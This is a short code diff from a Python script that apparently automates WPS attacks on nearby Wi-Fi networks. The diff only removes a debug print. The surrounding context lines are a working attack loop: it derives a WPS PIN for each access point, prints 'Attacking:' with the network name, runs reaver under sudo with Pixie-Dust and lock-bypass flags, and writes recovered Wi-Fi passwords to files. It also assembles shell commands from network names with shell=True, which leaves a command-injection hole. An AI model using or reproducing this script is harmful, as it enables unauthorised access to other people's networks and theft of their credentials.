@@ -82,7 +82,6 @@ for row in range(len(my_list)):
         mac_pin = os.popen('echo "'+ my_list[row][0]+'" |python3 '+os.path.dirname(__file__)+'/wpspin.py')
         print("Attacking: " +my_list[row][-1])
         mac_pin_clean=mac_pin.read().rstrip("\n")
-        print(is_integer(my_list[row][4]))
         print("Using WPS pin: "+mac_pin_clean)
         if is_integer(my_list[row][4]) is True:
          subprocess.call(["echo 'Y\n' | sudo timeout -k 5 5m reaver -i "+interface+"mon"+" -p "+mac_pin_clean+" -b "+my_list[row][0]+" -v -K -Z -L --no-nacks --ignore-locks -c "+my_list[row][4]+" | tee  "+ os.path.dirname(__file__)+"/WifiPassword/"+my_list[row][-1]+".txt"],shell=True)
